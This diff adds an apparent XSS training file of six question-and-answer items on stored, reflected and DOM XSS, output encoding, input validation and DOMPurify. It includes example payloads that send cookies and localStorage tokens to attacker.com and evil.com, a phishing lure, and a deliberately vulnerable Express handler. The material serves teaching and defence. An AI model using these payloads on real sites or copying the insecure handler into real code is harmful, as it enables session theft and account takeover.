@@ -1,0 +1,61 @@
+[
+  {
+    "title": "Stored (Persistent) XSS Analysis",
+    "ques": "Explain the mechanics of a **Stored (Persistent) Cross-Site Scripting (XSS)** vulnerability. Write a code example showing an insecure backend comment-saving handler in Node.js/Express and illustrate the malicious payload an attacker would store.",
+    "answer": {
+      "type": "code",
+      "lang": "javascript",
+      "content": "const express = require('express');\nconst app = express();\napp.use(express.json());\n\nconst comments = [];\n\n// VULNERABLE ENDPOINT: Stores raw unsanitized user comment directly into DB\napp.post('/api/comments', (req, res) => {\n  const userComment = req.body.comment;\n  comments.push({ text: userComment });\n  res.json({ success: true });\n});\n\n// When another user requests the page, the unescaped script executes in their browser\napp.get('/comments', (req, res) => {\n  let html = '<h1>User Comments</h1>';\n  comments.forEach(c => {\n    html += `<div>${c.text}</div>`; // Insecure concatenation without encoding\n  });\n  res.send(html);\n});\n\n// Malicious Stored Payload submitted by attacker:\n// <script>fetch('https://attacker.com/steal?cookie=' + document.cookie);</script>"
+    },
+    "explanation": "**Stored XSS** occurs when untrusted input is permanently stored in a database, file, or cache without prior sanitization or encoding. Every subsequent visitor who requests that stored data receives the malicious script, which executes automatically in their session context."
+  },
+  {
+    "title": "Reflected (Non-Persistent) XSS Exploitation",
+    "ques": "How does **Reflected XSS** differ from Stored XSS? Provide a practical scenario including an insecure search page URL and explain how an attacker tricks a victim into triggering it via phishing.",
+    "answer": {
+      "type": "text",
+      "content": "### Mechanism of Reflected XSS\n* In **Reflected XSS**, the malicious payload is **not stored** on the server. Instead, it is immediately reflected back to the user within the server's immediate HTTP response.\n\n### Practical Phishing Scenario:\n1. **Vulnerable Search Endpoint:**\n   * A web search page takes a query parameter: `https://bank.com/search?q=query`.\n   * The backend template renders: `<h2>Results for: <%- req.query.q %></h2>` without HTML entity encoding.\n2. **Crafting the Trap:**\n   * The attacker constructs a poisoned hyperlink:\n     `https://bank.com/search?q=<script>new Image().src='https://evil.com/leak?t='+localStorage.getItem('token')</script>`\n3. **Distribution & Execution:**\n   * The attacker sends an urgent phishing email: *'Your account statement has an error. Review it here [Link]!'*\n   * The victim clicks the trusted `bank.com` URL.\n   * The server echoes the attacker's query parameter verbatim into the HTML response, causing the script to run in the victim's authenticated browser tab."
+    },
+    "explanation": "Reflected XSS relies on external delivery mechanisms (social engineering, email links, malicious ads) because the vulnerability triggers only when the specific crafted request is sent by the victim."
+  },
+  {
+    "title": "DOM-Based XSS Mechanisms",
+    "ques": "Explain what **DOM-based XSS** is and identify the common client-side **sources** and **sinks**. Write a vulnerable JavaScript client snippet and provide the corrected version.",
+    "answer": {
+      "type": "code",
+      "lang": "javascript",
+      "content": "// --- VULNERABLE CLIENT-SIDE CODE ---\n// Source: location.hash (attacker controlled URL fragment)\nconst hashData = decodeURIComponent(window.location.hash.substring(1));\n\n// Sink: element.innerHTML (directly parses HTML tags and executable scripts)\nconst greetingContainer = document.getElementById('greeting');\ngreetingContainer.innerHTML = 'Welcome, ' + hashData;\n// If URL is https://app.com/#<img src=x onerror=alert(1)> the payload executes!\n\n// --- SECURE REFACTORED CODE ---\n// Mitigation: Use safe sink textContent which treats all data strictly as text\nconst safeContainer = document.getElementById('greeting');\nsafeContainer.textContent = 'Welcome, ' + hashData;\n// Output is rendered as literal text '<img src=x onerror=alert(1)>' without execution"
+    },
+    "explanation": "**DOM-based XSS** executes entirely within the browser's Document Object Model without server involvement. An untrusted **source** (such as `location.search`, `location.hash`, or `document.referrer`) flows into an execution **sink** (such as `innerHTML`, `document.write`, or `eval`)."
+  },
+  {
+    "title": "Output Encoding Strategies",
+    "ques": "Why is contextual **Output Encoding** considered the primary defense against Cross-Site Scripting? Write an HTML entity encoder function in JavaScript that safely escapes the 5 critical characters before inserting text into HTML body context.",
+    "answer": {
+      "type": "code",
+      "lang": "javascript",
+      "content": "/**\n * Escapes the 5 essential HTML characters to their safe entity equivalents.\n * Prevents user input from breaking out of text nodes into HTML elements.\n */\nfunction escapeHtml(str) {\n  if (typeof str !== 'string') return '';\n  \n  const htmlEntityMap = {\n    '&': '&amp;',\n    '<': '&lt;',\n    '>': '&gt;',\n    '\"': '&quot;',\n    \"'\": '&#x27;'\n  };\n  \n  return str.replace(/[&<>\"']/g, (char) => htmlEntityMap[char]);\n}\n\n// Example demonstration:\nconst rawUserInput = '<script>alert(\"XSS\")</script> & \"quotes\"';\nconst safeOutput = escapeHtml(rawUserInput);\nconsole.log(safeOutput);\n// Returns: &lt;script&gt;alert(&quot;XSS&quot;)&lt;/script&gt; &amp; &quot;quotes&quot;"
+    },
+    "explanation": "Output encoding turns executable control characters into harmless display representations. Context matters: HTML body requires HTML entity encoding, JavaScript variables require JS unicode escapes, and URL parameters require percent-encoding."
+  },
+  {
+    "title": "Robust Input Validation Principles",
+    "ques": "Contrast **Allow-list (Whitelist)** vs **Block-list (Blacklist)** input validation. Write a Node.js validation schema using regular expressions that strictly allows only valid alphanumeric usernames with specific length boundaries.",
+    "answer": {
+      "type": "code",
+      "lang": "javascript",
+      "content": "/**\n * Whitelist validation defines strictly what IS permitted.\n * Blacklist validation attempts to catch known bad characters, which attackers routinely bypass.\n */\nfunction validateUsername(username) {\n  // Must be a string\n  if (typeof username !== 'string') {\n    return { isValid: false, reason: 'Username must be a string' };\n  }\n  \n  // Whitelist rule: Alphanumeric characters, underscores, and hyphens only\n  // Length constraint: between 3 and 20 characters\n  const usernamePattern = /^[a-zA-Z0-9_-]{3,20}$/;\n  \n  if (!usernamePattern.test(username)) {\n    return {\n      isValid: false,\n      reason: 'Username must be 3-20 characters long and contain only letters, numbers, hyphens, and underscores.'\n    };\n  }\n  \n  return { isValid: true };\n}\n\n// Tests\nconsole.log(validateUsername('alice_2026')); // { isValid: true }\nconsole.log(validateUsername('<script>')); // { isValid: false, reason: '...' }"
+    },
+    "explanation": "Blacklists fail because attackers use alternate encodings, obfuscations, and rare tags (e.g., `<svg onload=...>`, `<details ontoggle=...>`). Strict allow-lists (whitelists) enforce known-good data formats, rejecting everything else by default."
+  },
+  {
+    "title": "Sanitization with DOMPurify",
+    "ques": "When an application legitimately needs to render rich text formatted by users (e.g., a Markdown blog post with `<b>`, `<i>`, `<a>` tags), simple text encoding breaks formatting.\n\nDemonstrate how to safely sanitize rich HTML input in the browser using the **DOMPurify** library, including custom configuration to allow only specific safe tags and attributes.",
+    "answer": {
+      "type": "code",
+      "lang": "javascript",
+      "content": "// Assuming DOMPurify is loaded via npm or CDN\n// import DOMPurify from 'dompurify';\n\nfunction renderRichUserBio(untrustedHtml) {\n  // Configure strict whitelist for allowable tags and attributes\n  const sanitizeConfig = {\n    ALLOWED_TAGS: ['b', 'i', 'em', 'strong', 'a', 'p', 'ul', 'li', 'code'],\n    ALLOWED_ATTR: ['href', 'title', 'target'],\n    ALLOW_DATA_ATTR: false\n  };\n  \n  // DOMPurify strips out script tags, onerror handlers, javascript: URIs\n  const cleanHtml = DOMPurify.sanitize(untrustedHtml, sanitizeConfig);\n  \n  const bioContainer = document.getElementById('user-bio');\n  bioContainer.innerHTML = cleanHtml;\n}\n\n// Untrusted input containing a stealthy XSS vector along with valid markup:\nconst dangerousInput = '<p>Welcome! <a href=\"javascript:alert(1)\">Click me</a> <img src=x onerror=alert(2)> <strong>Safe text</strong></p>';\n\nrenderRichUserBio(dangerousInput);\n// DOMPurify strips the malicious href and the img tag completely,\n// safely preserving only: <p>Welcome! <a>Click me</a> <strong>Safe text</strong></p>"
+    },
+    "explanation": "**DOMPurify** parses HTML against a living DOM tree, systematically stripping malicious event handlers, `<script>` tags, dangerous URIs (`javascript:`, `data:`), and known browser mutation exploits while preserving allowable semantic formatting."
+  }
+]
